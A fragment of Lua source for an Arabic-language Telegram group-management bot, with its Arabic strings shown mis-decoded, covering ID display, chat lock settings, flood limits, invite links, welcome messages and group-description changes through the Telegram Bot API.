local Texting = {"ูู ุตูุฑู ุธูู ุจุงููุจู ุ๐คค๐","ููุชูุน ุจุตูุฑุชู !ุ ๐น๐ค","ููุงู ููุงุณูู ุจูุฑูุจูู ุ๐คค๐","ููุงููู ุ๐คค๐","ูุดุฎู ุจุฑุจ ุ๐๐ค","ูุฒูุช ุจููุง ุฏุบูุฑูุง ุนุงุฏ ุ๐๐","ุตูุฑุชู ูุงูุฑุชุงุญููุง ุ๐๐ถ","ุญูุบูู ูุงููู ุ๐ฅบ๐","ูู ุตูุฑู ุบูุจูู ุจุฑุงุณูุง ูฆู? ุญุธ ุ๐น๐ค"}
local Description = Texting[math.random(#Texting)]
if rio.photos_[0] then
if not DevRio:get(Rinda..'Rio:Lock:Id'..msg.chat_id_) then 
if not DevRio:get(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_) then 
if DevRio:get(Rinda.."Rio:AllIds:Text") then
newpicid = DevRio:get(Rinda.."Rio:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#photos',(rio.total_count_ or 'ูุง ููุฌุฏ')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
newpicid = "โ๏ธฐ"..Description.."\nโ๏ธฐูุนุฑูู โข โจ "..username.." โฉ\nโ๏ธฐุงูุฏูู โข โจ "..msg.sender_user_id_.." โฉ\nโ๏ธฐุฑุชุจุชู โข "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธฐุฑุณุงุฆูู โข โจ "..user_msgs.." โฉ\nโ๏ธฐุณุญูุงุชู โข โจ "..edit_msg.." โฉ\nโ๏ธฐุชูุงุนูู โข "..formsgs(msguser).."\nโ๏ธฐููุงุทู โข โจ "..user_nkt.." โฉ\n-----------------------------------------\n"
end 
if not DevRio:get(Rinda.."Rio:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevRio:get(Rinda.."Rio:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#photos',(rio.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, rio.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevRio:get(Rinda.."Rio:AllIds:Text") then
newallid = DevRio:get(Rinda.."Rio:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#photos',(rio.total_count_ or 'ูุง ููุฌุฏ')) 
newallid = newallid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
newallid = "โ๏ธฐูุนุฑูู โข โจ "..username.." โฉ\nโ๏ธฐุงูุฏูู โข โจ "..msg.sender_user_id_.." โฉ\nโ๏ธฐุฑุชุจุชู โข "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธฐุฑุณุงุฆูู โข โจ "..user_msgs.." โฉ\nโ๏ธฐุณุญูุงุชู โข โจ "..edit_msg.." โฉ\nโ๏ธฐุชูุงุนูู โข "..formsgs(msguser).."\nโ๏ธฐููุงุทู โข โจ "..user_nkt.." โฉ"
end 
if not DevRio:get(Rinda.."Rio:GpIds:Text"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevRio:get(Rinda.."Rio:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#photos',(rio.total_count_ or 'ูุง ููุฌุฏ')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
Dev_Rio(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฐุฑุง ุงูุงูุฏู ูุนุทู ', 1, 'md')
end
else
if DevRio:get(Rinda.."Rio:AllIds:Text") then
notpicid = DevRio:get(Rinda.."Rio:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#photos',(rio.total_count_ or 'ูุง ููุฌุฏ')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
notpicid = "โ๏ธฐูุง ุงุณุชุทูุน ุนุฑุถ ุตูุฑุชู ูุงูู ููุช ุจุญุธุฑ ุงูุจูุช ุงู ุงูู ูุงุชูุชูู ุตูุฑู ูู ุจุฑููุงููู\n-----------------------------------------\nโ๏ธฐูุนุฑูู โข โจ "..username.." โฉ\nโ๏ธฐุงูุฏูู โข โจ "..msg.sender_user_id_.." โฉ\nโ๏ธฐุฑุชุจุชู โข "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธฐุฑุณุงุฆูู โข โจ "..user_msgs.." โฉ\nโ๏ธฐุณุญูุงุชู โข โจ "..edit_msg.." โฉ\nโ๏ธฐุชูุงุนูู โข "..formsgs(msguser).."\nโ๏ธฐููุงุทู โข โจ "..user_nkt.." โฉ\n-----------------------------------------\n"
end 
if not DevRio:get(Rinda..'Rio:Lock:Id'..msg.chat_id_) then
if not DevRio:get(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุนุฑูู โข โจ "..username.." โฉ\nโ๏ธฐุงูุฏูู โข โจ "..msg.sender_user_id_.." โฉ\nโ๏ธฐุฑุชุจุชู โข "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธฐุฑุณุงุฆูู โข โจ "..user_msgs.." โฉ\nโ๏ธฐุณุญูุงุชู โข โจ "..edit_msg.." โฉ\nโ๏ธฐุฑุณุงุฆูู โข โจ "..user_msgs.." โฉ\nโ๏ธฐุชูุงุนูู โข "..formsgs(msguser).."\nโ๏ธฐููุงุทู โข โจ "..user_nkt.." โฉ", 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุนุฐุฑุง ุงูุงูุฏู ูุนุทู', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, RindaTeam)
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ููู (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(ููู) (.*)$")}
if LockText[2] == "ุงูุชุนุฏูู" then
if not DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชุนุฏูู")  
DevRio:set(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชุนุฏูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุชุนุฏูู ุงูููุฏูุง" or LockText[2] == "ุชุนุฏูู ุงูููุฏูุง" then
if not DevRio:get(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุชุนุฏูู ุงูููุฏูุง")  
DevRio:set(Rinda..'Rio:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชุนุฏูู ุงูููุฏูุง ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุฑุณูู" then
if not DevRio:get(Rinda..'Rio:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุงุฑุณูู")  
DevRio:set(Rinda..'Rio:Lock:Farsi'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑุณูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุดุงุฑ" then
if DevRio:get(Rinda..'Rio:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุดุงุฑ")  
DevRio:del(Rinda..'Rio:Lock:Fshar'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุดุงุฑ ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุทุงุฆููู" then
if DevRio:get(Rinda..'Rio:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุทุงุฆููู")  
DevRio:del(Rinda..'Rio:Lock:Taf'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุทุงุฆููู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุฑ" then
if DevRio:get(Rinda..'Rio:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูููุฑ")  
DevRio:del(Rinda..'Rio:Lock:Kfr'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูููุฑ ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุฑุณูู ุจุงูุทุฑุฏ" then
if not DevRio:get(Rinda..'Rio:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงููุงุฑุณูู ุจุงูุทุฑุฏ")  
DevRio:set(Rinda..'Rio:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุงุฑุณูู ุจุงูุทุฑุฏ ุจุงููุนู ููููู ', 1, 'md')
end
end
if LockText[2] == "ุงูุจูุชุงุช" or LockText[2] == "ุงูุจูุชุงุช ุจุงูุญุฐู" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงูุญุฐู")  
DevRio:set(Rinda.."Rio:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "ุงูุจูุชุงุช ุจุงูุทุฑุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงูุทุฑุฏ")  
DevRio:set(Rinda.."Rio:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "ุงูุจูุชุงุช ุจุงูุชูููุฏ" or LockText[2] == "ุงูุจูุชุงุช ุจุงูุชููุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุจูุชุงุช ุจุงูุชููุฏ")  
DevRio:set(Rinda.."Rio:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ" or LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุญุฐู" then 
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุญุฐู")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ" then 
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุชููุฏ" or LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุชูููุฏ" then 
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงูุชููุฏ")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงููุชู" then 
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชูุฑุงุฑ ุจุงููุชู")  
end
if BasicConstructor(msg) then
if LockText[2] == "ุงูุชุซุจูุช" then
if not DevRio:get(Rinda..'Rio:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevRio:set(Rinda.."Rio:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ููู ุงูุชุซุจูุช")  
DevRio:set(Rinda..'Rio:Lock:Pin'..msg.chat_id_,true)
DevRio:sadd(Rinda.."Rio:Lock:Pinpin",msg.chat_id_) 
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุชุซุจูุช ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end end end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and (text:match("^ุถุน ุชูุฑุงุฑ (%d+)$") or text:match("^ูุถุน ุชูุฑุงุฑ (%d+)$")) then   
local TextSpam = text:match("ุถุน ุชูุฑุงุฑ (%d+)$") or text:match("ูุถุน ุชูุฑุงุฑ (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ุจุชุญุฏูุฏ ุนุฏุฏ ุงูุจุฑ ูู 2 ููุชูุฑุงุฑ', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ูุถุน ุนุฏุฏ ุงูุชูุฑุงุฑ โข '..TextSpam, 1, 'md')
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$") or text:match("^ูุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$")) then  
local TextSpam = text:match("ุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$") or text:match("ูุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$")
DevRio:hset(Rinda.."Rio:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ูุถุน ุฒูู ุงูุชูุฑุงุฑ โข '..TextSpam, 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Manager(msg) then
if text and text == 'ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูุฏู ุจุงูุตูุฑู ุจุงูุชุงููุฏ ููุนู', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงูุฏู ุจุงูุตูุฑู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู' and ChCheck(msg) then
if DevRio:get(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูุฏู ุจุงูุตูุฑู ุจุงูุชุงููุฏ ูุนุทู', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงูุฏู ุจุงูุตูุฑู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'ุชูุนูู ุงูุงูุฏู' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูุฏู ุจุงูุชุงููุฏ ููุนู ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุงูุฏู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda..'Rio:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'ุชุนุทูู ุงูุงูุฏู' and ChCheck(msg) then
if DevRio:get(Rinda..'Rio:Lock:Id'..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุงูุฏู ุจุงูุชุงููุฏ ูุนุทู ', 1, 'md')
else
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงูุฏู ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda..'Rio:Lock:Id'..msg.chat_id_,true)
end end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุถุน ุฑุงุจุท' and ChCheck(msg) or text == 'ูุถุน ุฑุงุจุท' and ChCheck(msg) or text == 'ุถุน ุงูุฑุงุจุท' and ChCheck(msg) or text == 'ูุถุน ุงูุฑุงุจุท' and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ุฑุงุจุท ุงููุฌููุนู ุงู ุฑุงุจุท ููุงุฉ ุงููุฌููุนู', 1, 'md')
DevRio:setex(Rinda.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'ุงูุดุงุก ุฑุงุจุท' and ChCheck(msg) or text == 'ุงูุดุงุก ุงูุฑุงุจุท' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevRio:get(Rinda.."Rio:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevRio:set(Rinda.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุดุงุก ุฑุงุจุท ุฌุฏูุฏ ุงุฑุณู โข ุงูุฑุงุจุท', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุฏุนูุฉ ุงููุณุชุฎุฏููู ุนุจุฑ ุงูุฑุงุจุท ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ุฑุงุจุท ุงููุฌููุนู ุงู ุฑุงุจุท ููุงุฉ ุงููุฌููุนู', 1, 'md')
DevRio:setex(Rinda.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if text and text:match("^ุชูุนูู ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุชุฑุญูุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Rinda.."Rio:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^ุชุนุทูู ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุชุฑุญูุจ ุถูุนู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Rinda.."Rio:Lock:Welcome"..msg.chat_id_)
end
if DevRio:get(Rinda..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุชุฑุญูุจ', 1, 'md')
DevRio:del(Rinda..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Rinda..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevRio:set(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุญูุธ ูููุดุฉ ุงูุชุฑุญูุจ', 1, 'md')
return false   
end
if text and text:match("^ุถุน ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ูุถุน ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุงุถู ุชุฑุญูุจ$") and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุฑุณู ูู ุงูุชุฑุญูุจ ุงูุงู\nโ๏ธฐุชุณุชุทูุน ุงุถุงูุฉ ูุงููู โข โค\nโ๏ธฐุฏุงูุฉ ุนุฑุถ ุงูุงุณู โข firstname\nโ๏ธฐุฏุงูุฉ ุนุฑุถ ุงููุนุฑู โข username', 1, 'md')
DevRio:set(Rinda..'Rio:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^ุญุฐู ุงูุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุญุฐู ุชุฑุญูุจ$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูุชุฑุญูุจ")  
DevRio:del(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^ุฌูุจ ุงูุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุฌูุจ ุชุฑุญูุจ$") and ChCheck(msg) or text and text:match("^ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local Welcomes = DevRio:get(Rinda..'Rio:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_Rio(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูู ูุชู ูุถุน ุงูุชุฑุญูุจ \nโ๏ธฐุงุฑุณู โข ุถุน ุชุฑุญูุจ ููุญูุธ ', 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DevRio:get(Rinda..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'ุงูุบุงุก' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุญูุธ ุงููุตู", 1, 'md')
DevRio:del(Rinda..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Rinda..'Rio:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุชุบููุฑ ูุตู ุงููุฌููุนู', 1, 'md')
return false  
end 
